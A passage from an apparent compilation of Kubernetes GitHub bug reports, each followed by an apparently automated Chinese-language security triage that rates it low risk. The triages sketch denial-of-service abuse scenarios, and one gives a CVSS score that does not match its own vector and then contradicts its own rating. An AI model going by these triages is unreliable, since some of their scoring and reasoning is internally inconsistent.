<img width="1043" alt="Clipboard_Screenshot_1732443860" src="https://github.com/user-attachments/assets/36998270-1af6-4583-b037-c0c55170a5e7">

On the node, this is only about two thousand three hundred iptables rules.
[centos ~]# iptables-save | wc -l
2358
[centos ~]# 

And the number of pod and service in this cluster is less than 1000.
[root ~]$ kubectl get svc -A | wc -l
414
[root ~]$ kubectl get endpoints -A | wc -l
417
[ root ~]$ kubectl get pod -A | wc -l
831
[root ~]$ kubectl get endpointslices -A | wc -l
552
[root ~]$ 



Here are some results of the reproduction：
1， 
<img width="1223" alt="Clipboard_Screenshot_1732323625" src="https://github.com/user-attachments/assets/c47becc3-013d-4d13-8302-ca43d344d0a7">

2,
  HELP kubeproxy_sync_proxy_rules_endpoint_changes_total [ALPHA] Cumulative proxy rules Endpoint changes
  TYPE kubeproxy_sync_proxy_rules_endpoint_changes_total counter
kubeproxy_sync_proxy_rules_endpoint_changes_total 681443
  HELP kubeproxy_sync_proxy_rules_service_changes_total [ALPHA] Cumulative proxy rules Service changes
  TYPE kubeproxy_sync_proxy_rules_service_changes_total counter
kubeproxy_sync_proxy_rules_service_changes_total 1.363076e+06


#### What did you expect to happen?

when the number of pod and service is less than 1000, the memory should not occupy so much memory (about 8G).

#### How can we reproduce it (as minimally and precisely as possible)?

1, Create service and delete it repeatedly.
2, When creating service, the namespace name or service name should be different from all previously created.
Memory will slowly increase.

#### Anything else we need to know?

_No response_

#### Kubernetes version

v1.30

#### Cloud provider

tke

#### OS version
ubuntu2204


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该问题描述了在使用 iptables 模式的 kube-proxy 中，当反复创建并删除具有不同命名空间名称或服务名称的服务时，kube-proxy 的 EndpointSliceCache 出现了内存泄漏，导致内存占用不断增加，甚至达到约 8GB。攻击者如果能够在集群中大量创建并删除唯一名称的服务，可能会导致 kube-proxy 组件内存耗尽，影响节点的正常运行，造成拒绝服务（DoS）攻击。

根据风险判断标准第 4 条，针对拒绝服务（DoS）攻击，如果攻击者需要具备创建、修改等非只读权限（如创建和删除服务）的操作能力，则不应判断为高风险，CVSS 评级在 high 以下。

因此，该问题存在安全风险，但由于需要非特权用户权限才能被利用，风险评级为低风险。

---

## Issue #128865 resourceFieldRef.divisor when unspecified is set to 0 (documented is 1) 

- Issue 链接：[#128865](https://github.com/kubernetes/kubernetes/issues/128865)

### Issue 内容

#### What happened?

The divisor key in [ResourceFieldRef](https://kubernetes.io/docs/reference/kubernetes-api/common-definitions/resource-field-selector/#ResourceFieldSelector) is documented to default to 1.

However, when applying a manifest using a resourceFieldRef without specifying the divisor, then checking the spec, the divisor is set to '0'.

#### What did you expect to happen?

The field should either not be present when checking the manifests, or having the correct value.

#### How can we reproduce it (as minimally and precisely as possible)?

On a kubernetes cluster, deploy the following manifest:
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: test-divisor
  name: test-divisor
spec:
  replicas: 1
  selector:
    matchLabels:
      app: test-divisor
  template:
    metadata:
      labels:
        app: test-divisor
    spec:
      containers:
      - image: invalid-name
        name: test-divisor
        resources:
          limits:
            memory: 30M
        env:
        - name: GOMEMLIMIT
          valueFrom:
            resourceFieldRef:
              resource: limits.memory
```

Then run 
```console
$ kubectl get deploy test-divisor -o jsonpath='{.spec.template.spec.containers[0].env[0].valueFrom.resourceFieldRef.divisor}{"\n"}'
0
```

#### Anything else we need to know?

This cause problem for things like argocd which considers the application perpetually out of sync (see cilium/cilium#3063)

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.29.10
WARNING: version difference between client (1.31) and server (1.29) exceeds the supported minor version skew of +/-1
```

</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
$ cat /etc/os-release
NAME="Arch Linux"
PRETTY_NAME="Arch Linux"
ID=arch
BUILD_ID=rolling
ANSI_COLOR="38;2;23;147;209"
HOME_URL="https://archlinux.org/"
DOCUMENTATION_URL="https://wiki.archlinux.org/"
SUPPORT_URL="https://bbs.archlinux.org/"
BUG_REPORT_URL="https://gitlab.archlinux.org/groups/archlinux/-/issues"
PRIVACY_POLICY_URL="https://terms.archlinux.org/docs/privacy-policy/"
LOGO=archlinux-logo

$ uname -a
Linux framework 6.11.6-arch1-1 #1 SMP PREEMPT_DYNAMIC Fri, 01 Nov 2024 03:30:41 +0000 x86_64 GNU/Linux
```
</details>


#### Install tools

<details>
Kubespray
</details>


#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue报告了在Kubernetes中，当`ResourceFieldRef`的`divisor`未指定时，实际应用的配置中`divisor`被设置为`0`，而文档中指出默认值应为`1`。这种不一致可能导致在使用`divisor`进行除法计算时出现除以零的错误，引发程序异常或崩溃，造成拒绝服务（DoS）攻击的可能性。

但是，要利用此问题，攻击者需要具备在集群中创建或修改资源的权限，即需要较高的权限来部署特定的Manifest文件。

根据风险判断标准第4条，当漏洞利用需要攻击者具备创建、修改等非只读权限时，不应判断为高风险，CVSS评级在`high`以下。

因此，该Issue存在安全风险，但风险评级为低风险。

---

## Issue #128832 Conflicting topologySpreadConstraints, podManagementPolicy: OrderedReady  and PVCs can lead to unschedulable pods in StatefulSets

- Issue 链接：[#128832](https://github.com/kubernetes/kubernetes/issues/128832)

### Issue 内容

#### What happened?

I honestly don't know if this is a real bug or not, since it seems like the configuration conflicts with itself. I thought I'd file a bug and see what sig-scheduling says, since the behaviour isn't obvious to the user until the situation occurs.

With a StatefulSet it's possible to end up in a situation (after an outage) where some of these Pods are unable to schedule, if the StatefulSet has the following rules:
1. 5 replicas
2. A volumeClaimTemplates
3. Across 3 zones
4. `podManagementPolicy: OrderedReady`
5. A topologySpreadConstraints matching `topologyKey: topology.kubernetes.io/zone` with `maxSkew: 1`

Example StatefulSet below.

When deploying a StatefulSet with this configuration, if 2 Pods are lost, one in the single-pod-zone and another Pod with a lower number, then the StatefulSet is stuck can't replace those Pods due to a conflict of scheduling rules.

Let me try explain with some diagrams.

---

After applying the example StatefulSet, the Pods land in a configuration as such:
![image](https://github.com/user-attachments/assets/d039a682-1982-4272-a0b3-dc201ef4f365)
(Note, each Pod also has a related PVC with it)

This makes sense with all the rules configured and all Pods are healthy.

When `pod-1` and `pod-0` are deleted (due to node failures) we end up with this situation:
![image](https://github.com/user-attachments/assets/3c3e74e2-5404-4b58-bf98-a02246e0d7dd)

The StatefulSet Controller will then create `pod-0` (since `OrderedReady` is configured), but it will try be placed into the `Zone 2` zone (Since we have a maxSkew 1 topologySpreadConstraints zone policy).

However, the PVC for `pod-0` is in Zone 1, meaning that the Pod can never be scheduled. This stops the StatefulSet controller from continuing to `pod-1`.

It seems that the only way to fix this is to temporarily set `maxSkew` to 2 for the topologySpreadConstraints zone policy, or to delete the PVC in Zone 1

#### What did you expect to happen?

It's difficult to way what I expect to happen, because the only way to schedule a Pod is to override the rule that I set as the operator.

Either schedule `pod-0` in the correct zone (bypassing the topologySpreadConstraints zone policy) 
Or schedule `pod-1` first (bypassing `OrderedReady`.

May be this situation is an exception for `OrderedReady`, since the StatefulSet isn't a new one, and is only recovering from a failure.

#### How can we reproduce it (as minimally and precisely as possible)?

```
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: testing
spec:
  persistentVolumeClaimRetentionPolicy:
    whenDeleted: Retain
    whenScaled: Retain
  podManagementPolicy: OrderedReady
  replicas: 5
  revisionHistoryLimit: 4
  selector:
    matchLabels:
      app.kubernetes.io/name: testing
  serviceName: ""
  template:
    metadata:
      labels:
        app.kubernetes.io/name: testing
    spec:
      automountServiceAccountToken: true
      containers:
      - image: nginx
        imagePullPolicy: IfNotPresent
        name: nginx
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /mount
          name: testing-pvc
      dnsPolicy: ClusterFirst
      restartPolicy: Always
      schedulerName: default-scheduler
      serviceAccount: default
      serviceAccountName: default
      terminationGracePeriodSeconds: 30
      topologySpreadConstraints:
      - labelSelector:
          matchLabels:
            app.kubernetes.io/name: testing
        maxSkew: 1
        nodeTaintsPolicy: Honor
        topologyKey: topology.kubernetes.io/zone
        whenUnsatisfiable: DoNotSchedule
      - labelSelector:
          matchLabels:
            app.kubernetes.io/name: testing
        maxSkew: 1
        nodeTaintsPolicy: Honor
        topologyKey: kubernetes.io/hostname
        whenUnsatisfiable: DoNotSchedule
  updateStrategy:
    rollingUpdate:
      partition: 0
    type: RollingUpdate
  volumeClaimTemplates:
  - apiVersion: v1
    kind: PersistentVolumeClaim
    metadata:
      creationTimestamp: null
      name: testing-pvc
    spec:
      accessModes:
      - ReadWriteOnce
      resources:
        requests:
          storage: 3Gi
      volumeMode: Filesystem
    status:
      phase: Pending
```

#### Anything else we need to know?

Some context of the situation we're in:
1. We're using Ordered Ready, since the [vault-operator](https://github.com/bank-vaults/vault-operator/blob/v1.22.3/pkg/controller/vault/vault_controller.go#L1344-L1347) we use has that hardcoded
2. We want 5 replicas of Vault, due to the [recommendation from Hashicorp](https://developer.hashicorp.com/vault/docs/internals/integrated-storage#quorum-size-and-failure-tolerance).

I imagine if this isn't a Kubernetes bug, I should ask the vault-operator project to allow configurable `podManagementPolicy`, to avoid this situation from happening, however, I assume other users have similar constraints, and somehow fixing it in Kubernetes may be useful.

Some changes we considered:
1. Increasing replicas to 6. This should solve the problem, but conflicts with Hashicorp's suggestion of [running 5 replicas](https://developer.hashicorp.com/vault/docs/internals/integrated-storage#quorum-size-and-failure-tolerance).
2. Change maxSkew to 2. This actually helps un-stuck the pods, but on initial deployment it won't guarantee even spread across all AZs.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.30.2```

</details>


#### Cloud provider

<details>
AWS via kOps
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>

/sig scheduling

### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在Kubernetes中，使用StatefulSet时，如果配置了`podManagementPolicy: OrderedReady`，并且设置了`topologySpreadConstraints`的`maxSkew: 1`，在多可用区部署情况下，当某些Pod和对应的PVC丢失时，由于调度约束和PVC所在区域不一致，导致Pod无法调度，StatefulSet无法继续创建后续的Pod。

这个问题是由于配置冲突导致的，属于运维和配置管理的问题。攻击者需要具备对StatefulSet的修改权限或者能够删除Pod和PVC的权限才能触发该问题。

根据风险判断标准：

1. **该风险能被攻击者利用**：需要攻击者具备对StatefulSet或集群资源的修改权限。
2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：攻击者需要一定的权限才能利用该问题，按照CVSS评分，不应判断为高风险。
4. **当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS评级在high以下**。

因此，该Issue不涉及高风险的安全漏洞。

---

## Issue #128814 `volumes[*].hostPath.type: Socket` doesn’t prevent the kubelet from creating a directory instead of waiting for a UNIX socket to be created.

- Issue 链接：[#128814](https://github.com/kubernetes/kubernetes/issues/128814)

### Issue 内容

#### What happened?

[`hostPath` volumes have different types](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath-volume-types).
By default, no check is done. Whatever is found is bind-mounted and, if nothing exists, a directory is created on the host.
But, if the type is `Socket`, the kubelet is supposed to check that a UNIX socket exists at the expected location before starting the pod.

Yet, if the container restarts after the UNIX socket has disappeared, then a directory is created instead.
This leads to an unrecoverable issue because the directory will prevent the server from eventually re-creating the UNIX socket.

#### What did you expect to happen?

If a container mounting a `Socket` `hostPath` restarts after the socket has been deleted, it should hang until the socket comes back.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a pod that mounts a socket:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: foo
  labels:
    app: foo
spec:
  replicas: 1
  selector:
    matchLabels:
      app: foo
  template:
    metadata:
      labels:
        app: foo
    spec:
      containers:
        - name: sleeper
          image: busybox
          command:
            - sleep
            - infinity
          volumeMounts:
            - name: socket
              mountPath: /tmp/foo.sock
      volumes:
        - name: socket
          hostPath:
            path: /tmp/foo.sock
            type: Socket
```

The pod initially remains pending because there’s no UNIX socket at `/tmp/foo.sock`:

```console
$ kubectl get pods
NAME                  READY   STATUS              RESTARTS   AGE
foo-976c59756-gw2zd   0/1     ContainerCreating   0          97s
$ kubectl describe pod/foo-976c59756-gw2zd 
Name:             foo-976c59756-gw2zd
Namespace:        foo
Priority:         0
Service Account:  default
Node:             gke-gke-lenaic-ubuntu-containerd-38134859-476h/10.0.96.131
Start Time:       Fri, 15 Nov 2024 16:33:09 +0100
Labels:           app=foo
                  pod-template-hash=976c59756
Annotations:      <none>
Status:           Pending
IP:               
IPs:              <none>
Controlled By:    ReplicaSet/foo-976c59756
Containers:
  sleeper:
    Container ID:  
    Image:         busybox
    Image ID:      
    Port:          <none>
    Host Port:     <none>
    Command:
      sleep
      infinity
    State:          Waiting
      Reason:       ContainerCreating
    Ready:          False
    Restart Count:  0
    Environment:    <none>
    Mounts:
      /tmp/foo.sock from socket (rw)
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-52bxl (ro)
Conditions:
  Type                        Status
  PodReadyToStartContainers   False 
  Initialized                 True 
  Ready                       False 
  ContainersReady             False 
  PodScheduled                True 
Volumes:
  socket:
    Type:          HostPath (bare host directory volume)
    Path:          /tmp/foo.sock
    HostPathType:  Socket
  kube-api-access-52bxl:
    Type:                    Projected (a volume that contains injected data from multiple sources)
    TokenExpirationSeconds:  3607
    ConfigMapName:           kube-root-ca.crt
    ConfigMapOptional:       <nil>
    DownwardAPI:             true
QoS Class:                   BestEffort
Node-Selectors:              cloud.google.com/gke-nodepool=ubuntu-containerd
Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:
  Type     Reason       Age                  From               Message
  ----     ------       ----                 ----               -------
  Normal   Scheduled    2m20s                default-scheduler  Successfully assigned foo/foo-976c59756-gw2zd to gke-gke-lenaic-ubuntu-containerd-38134859-476h
  Warning  FailedMount  12s (x9 over 2m20s)  kubelet            MountVolume.SetUp failed for volume "socket" : hostPath type check failed: /tmp/foo.sock is not a socket file
```

This is expected.

Then, create the UNIX socket on the node:

```console
# timeout 1 nc -lU /tmp/foo.sock
# ls -l /tmp/foo.sock
srwxr-xr-x 1 root root 0 Nov 15 15:38 /tmp/foo.sock
```

The pod transitions to `Running` state and the containers are started:

```console
$ kubectl describe pod/foo-976c59756-gw2zd 
Name:             foo-976c59756-gw2zd
Namespace:        foo
Priority:         0
Service Account:  default
Node:             gke-gke-lenaic-ubuntu-containerd-38134859-476h/10.0.96.131
Start Time:       Fri, 15 Nov 2024 16:33:09 +0100
Labels:           app=foo
                  pod-template-hash=976c59756
Annotations:      <none>
Status:           Running
IP:               10.4.1.6
IPs:
  IP:           10.4.1.6
Controlled By:  ReplicaSet/foo-976c59756
Containers:
  sleeper:
    Container ID:  containerd://3a6b9dab9a721eba41c8bbb8d5783ec952e1c37e8bafef634d0ece8fa2b8b2a1
    Image:         busybox
    Image ID:      docker.io/library/busybox@sha256:768e5c6f5cb6db0794eec98dc7a967f40631746c32232b78a3105fb946f3ab83
    Port:          <none>
    Host Port:     <none>
    Command:
      sleep
      infinity
    State:          Running
      Started:      Fri, 15 Nov 2024 16:39:23 +0100
    Ready:          True
    Restart Count:  0
    Environment:    <none>
    Mounts:
      /tmp/foo.sock from socket (rw)
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-52bxl (ro)
Conditions:
  Type                        Status
  PodReadyToStartContainers   True 
  Initialized                 True 
  Ready                       True 
  ContainersReady             True 
  PodScheduled                True 
Volumes:
  socket:
    Type:          HostPath (bare host directory volume)
    Path:          /tmp/foo.sock
    HostPathType:  Socket
  kube-api-access-52bxl:
    Type:                    Projected (a volume that contains injected data from multiple sources)
    TokenExpirationSeconds:  3607
    ConfigMapName:           kube-root-ca.crt
    ConfigMapOptional:       <nil>
    DownwardAPI:             true
QoS Class:                   BestEffort
Node-Selectors:              cloud.google.com/gke-nodepool=ubuntu-containerd
Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:
  Type     Reason       Age                     From               Message
  ----     ------       ----                    ----               -------
  Normal   Scheduled    6m46s                   default-scheduler  Successfully assigned foo/foo-976c59756-gw2zd to gke-gke-lenaic-ubuntu-containerd-38134859-476h
  Warning  FailedMount  2m36s (x10 over 6m46s)  kubelet            MountVolume.SetUp failed for volume "socket" : hostPath type check failed: /tmp/foo.sock is not a socket file
  Normal   Pulling      33s                     kubelet            Pulling image "busybox"
  Normal   Pulled       32s                     kubelet            Successfully pulled image "busybox" in 1.273s (1.273s including waiting). Image size: 2166802 bytes.
  Normal   Created      32s                     kubelet            Created container sleeper
  Normal   Started      32s                     kubelet            Started container sleeper
```

This is still fine.

Then, delete the UNIX socket from the node:

```console
# rm /tmp/foo.sock
# ls -l /tmp/foo.sock
ls: cannot access '/tmp/foo.sock': No such file or directory
```

And crash the container that mounts the socket to force its restart:

```console
# pkill -KILL -f "sleep infinity"
```

Then, once the container has restarted, `/tmp/foo.sock` becomes a directory:

```console
# ls -l /tmp/foo.sock
total 0
# ls -ld /tmp/foo.sock
drwxr-xr-x 2 root root 4096 Nov 15 15:46 /tmp/foo.sock
```

#### Anything else we need to know?

In real life, this bug affects situations where we have two pods communicating through a UNIX socket shared via a `hostPath` volume:
* A “server” pod has a `hostPath` volume for a directory on the host and creates a UNIX socket inside this directory.
* A “client” pod has a `hostPath` volume for the UNIX socket.

If the container of the “client” pod restarts while the “server” pod is cleanly redeployed (and the “server” process deletes the UNIX socket when shutdown), then a directory is created and it will prevent the “server” pod from re-creating it forever.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.31.1-gke.1678000
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux gke-gke-lenaic-ubuntu-containerd-38134859-476h 5.15.0-1067-gke #73-Ubuntu SMP Sat Aug 31 04:29:32 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
这个 Issue 描述了当使用 `hostPath` 卷类型为 `Socket` 时，如果容器重启后 Unix socket 消失，kubelet 会在主机上创建一个目录，而不是等待 socket 重新出现。这会导致一个不可恢复的问题，因为创建的目录会阻止服务器重新创建 Unix socket。

从安全角度来看，这个问题可能导致拒绝服务（DoS）攻击，因为目录的存在阻止了 socket 的重新创建，导致服务不可用。

然而，根据风险判断标准：

- 攻击者需要具备一定的权限才能实施此攻击，需要能够配置 `hostPath` 卷并部署 Pod。这通常需要更高的权限，不是低权限用户能够做到的。

- 对于拒绝服务（DoS）攻击，如果攻击者需要一定权限才能够实施该攻击，则应当降级处理，不应判断为高风险。

因此，综合考虑，这个问题存在安全风险，但风险评级在 high 以下，判断为低风险。

---

## Issue #128769 [FG:InPlacePodVerticalScaling] containers with a CPU limit below 10m have a resize status of InProgress indefinetly

- Issue 链接：[#128769](https://github.com/kubernetes/kubernetes/issues/128769)

### Issue 内容

There is an implicit minimum of `10m` for CPU limits, so the actual resource limit is always clamped at a minimum of 10m. If the desired CPU limit is below 10m, the comparison of desired == actual fails, and the resize status is set to in-progress.

This is very similar to the case of minimum shares addressed in https://github.com/kubernetes/kubernetes/pull/128680

/kind bug
/sig node
/priority important-soon
/milestone v1.32

### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在Kubernetes中，当容器的CPU限制设定为低于`10m`时，实际的资源限制会被最小值`10m`所替代。因此，当期望的CPU限制低于`10m`时，实际限制和期望限制不一致，导致容器的调整状态（resize status）一直处于`InProgress`状态。

从安全角度来看，这可能会导致资源管理的问题，例如容器无法正确调整资源限制，可能影响系统的资源分配效率。但要利用这一问题，攻击者需要具备修改容器CPU限制的权限，这通常是受限制的操作。

根据风险判断标准，第4条指出，当攻击者需要一定权限才能实施攻击，且需要创建、修改等非只读权限时，不应判断为高风险。因此，此问题属于低风险。

---

## Issue #128739 The pod is in Terminating state and cannot be deleted.

- Issue 链接：[#128739](https://github.com/kubernetes/kubernetes/issues/128739)

### Issue 内容

#### What happened?

After the pod is created, kubelet is attaching volumes. One volume of the csi type fails to be attached. When the pod is deleted, kubelet displays the DELETE log. However, the volume still fails to be attached. However, the volume that fails to be attached is not detached in the volume detaching process. In this case, the pod is always in the Terminating state.

Here are some of the logs：
kubelet.log_20241110-011239.gz:I1109 15:20:58.829354  991024 reconciler_common.go:231] "operationExecutor.MountVolume started for volume \"log\" (UniqueName: \"kubernetes.io/csi/611e4a7f-e11c-4a85-a9de-c12786553c1b-log\") pod \"apicatalogmgrservice-76cb4ddf47-gcqdc\" (UID: \"611e4a7f-e11c-4a85-a9de-c12786553c1b\") " pod="sop/apicatalogmgrservice-76cb4ddf47-gcqdc"
kubelet.log_20241110-011239.gz:I1109 15:21:07.311383  991024 kubelet.go:2446] "SyncLoop DELETE" source="api" pods=["sop/apicatalogmgrservice-76cb4ddf47-gcqdc"]
kubelet.log_20241110-011239.gz:E1109 15:22:58.832641  991024 nestedpendingoperations.go:348] Operation for "{volumeName:kubernetes.io/csi/611e4a7f-e11c-4a85-a9de-c12786553c1b-log podName:611e4a7f-e11c-4a85-a9de-c12786553c1b nodeName:}" failed. No retries permitted until 2024-11-09 15:23:02.832622173 +0000 UTC m=+217774.838649689 (durationBeforeRetry 4s). Error: MountVolume.SetUp failed for volume "log" (UniqueName: "kubernetes.io/csi/611e4a7f-e11c-4a85-a9de-c12786553c1b-log") pod "apicatalogmgrservice-76cb4ddf47-gcqdc" (UID: "611e4a7f-e11c-4a85-a9de-c12786553c1b") : rpc error: code = Unknown desc = malformed header: missing HTTP content-type

However, the operationExecutor.UnmountVolume started log is not displayed.

Only the following information is seen
kubelet.log_20241110-011239.gz:I1109 15:22:58.950400  991024 reconciler_common.go:300] "Volume detached for volume \"log\" (UniqueName: \"kubernetes.io/csi/611e4a7f-e11c-4a85-a9de-c12786553c1b-log\") on node \"master2\" DevicePath \"\""



#### What did you expect to happen?

The pod should be correctly deleted or the volume that fails to be attached should trigger the volume detaching process.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a pod and ensure that a volume fails to be attached to a csi volume. Delete the pod. After the pod is deleted, the volume fails to be attached to the volume again. Then, the pod remains in the Terminating state.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.31
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在使用CSI卷的情况下，若卷的挂载失败，然后删除Pod，导致Pod一直处于Terminating状态，无法删除。由于卷未正确卸载，Pod无法正常终止。这可能导致资源泄露，系统中残留大量无法删除的Pod，可能造成拒绝服务（DoS）攻击的风险。

然而，要利用此问题，攻击者需要具备创建特定Pod的权限，能够配置失败的CSI卷挂载。这意味着攻击者需要一定的权限才能实施该攻击。

根据风险判断标准第4条，当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS评级在high以下。

因此，该Issue涉及的安全风险评级为低风险。

---

## Issue #128790 Eviction manager should evict terminated pods before running pods

- Issue 链接：[#128790](https://github.com/kubernetes/kubernetes/issues/128790)

### Issue 内容

#### What happened?

Consider two pods are running on the node:
1.  pod with a large image size but in terminated state.
2.  running pod which is utilizing disk space just above the eviction limit.

kubelet's eviction manager will evict the running pod first instead of evicting the terminated pod and cleaning up the image.

#### What did you expect to happen?

kubelet should evict terminated pods and clean up images first beforing deciding to evict the running pod.

#### How can we reproduce it (as minimally and precisely as possible)?

1. create a pod with large image size and let it run to completion (you can write some data to writable layers if there's no large image).
2. create a pod with different image but it should utilize disk space until eviction limit.
3. watch kubelet evict the running pod first.

#### Anything else we need to know?

I think we should modify our node reclaim funcs to prioritize terminated pods first - https://github.com/kubernetes/kubernetes/blob/c9092f69fc0c099062dd23cd6ee226bcd52ec790/pkg/kubelet/eviction/helpers.go#L1222

#### Kubernetes version

<details>

```console
$ kubectl version
1.31
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
**问题描述：**

在 Kubernetes 中，当节点磁盘空间不足时，kubelet 的驱逐管理器（eviction manager）会根据资源使用情况驱逐 Pod。当前的行为是，即使存在已终止的 Pod（Terminated Pods）占用了大量磁盘空间，kubelet 仍可能优先驱逐正在运行的 Pod，而不是先清理已终止的 Pod 及其占用的镜像。

**潜在风险：**

在多租户环境或共享集群中，低权限用户可能通过以下方式造成拒绝服务（DoS）攻击：

1. 创建一个占用大量磁盘空间的 Pod，并让其运行完成（终止）。
2. 由于已终止的 Pod 及其镜像仍占用磁盘空间，导致节点磁盘空间接近或达到驱逐阈值。
3. kubelet 在磁盘压力下，可能优先驱逐其他正在运行的 Pod（可能属于其他用户或关键服务），而不是清理已终止的 Pod。

这可能导致其他用户的服务被中断，影响集群的稳定性和可用性。

**风险评估：**

根据 CVSS 3.1 评分标准：

- **攻击向量（AV）：** 网络（N）
- **攻击复杂度（AC）：** 低（L）
- **权限要求（PR）：** 低（L）——攻击者需要能在集群中创建 Pod 的权限
- **用户交互（UI）：** 无需（N）
- **作用范围（S）：** 未改变（U）
- **机密性（C）：** 无影响（N）
- **完整性（I）：** 无影响（N）
- **可用性（A）：** 高（H）

根据上述指标，综合得分为 5.9，属于中等风险（Medium）。

**结论：**

该问题存在安全风险，可能被低权限用户利用，导致其他用户的 Pod 被驱逐，造成拒绝服务（DoS）攻击。但由于需要具备创建 Pod 的权限，且对集群其他方面影响有限，故风险评级判断为低风险。

---

## Issue #128695 PersistentVolumeClaim cannot be deleted.

- Issue 链接：[#128695](https://github.com/kubernetes/kubernetes/issues/128695)

### Issue 内容

#### What happened?

https://github.com/kubernetes/kubernetes/blob/c25f5eefe4efda4c0d9561d06942cd3de3dfe2e4/pkg/controller/volume/pvcprotection/pvc_protection_controller.go#L374-L388
If a pod with UnexpectedAdmissionError exists in the environment and PersistentVolumeClaim is used, the PVC cannot be deleted after the pod is deleted. The controller-manager log shows that Pod uses PVC xxx. Check the code and find that the podUsesPVC method does not determine the pod status. I think this is a problem.

#### What did you expect to happen?

The pvc should be deleted correctly.

#### How can we reproduce it (as minimally and precisely as possible)?

Construct a pod in the UnexpectedAdmissionError state, configure a PVC, and delete the pod that is using the PVC.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.31
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue指出，当环境中存在状态为UnexpectedAdmissionError的Pod并使用PersistentVolumeClaim（PVC）时，即使删除了该Pod，PVC也无法被删除。检查代码后发现，`podUsesPVC`方法没有判断Pod的状态，导致控制器仍然认为PVC被Pod使用。

从安全角度分析，这种情况可能导致资源无法释放，进而可能被恶意用户利用，通过创建大量异常状态的Pod并绑定PVC，导致PVC无法删除，造成存储资源耗尽，属于拒绝服务（DoS）攻击。

根据风险判断标准第4条：当风险为拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能够实施该攻击，则应降级处理。当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS评级在high以下。

在该问题中，攻击者需要具备创建Pod和PVC的权限才能实施攻击，因此风险评级应为低风险。

---

## Issue #128684 No overflow validation when using MilliValue()

- Issue 链接：[#128684](https://github.com/kubernetes/kubernetes/issues/128684)

### Issue 内容

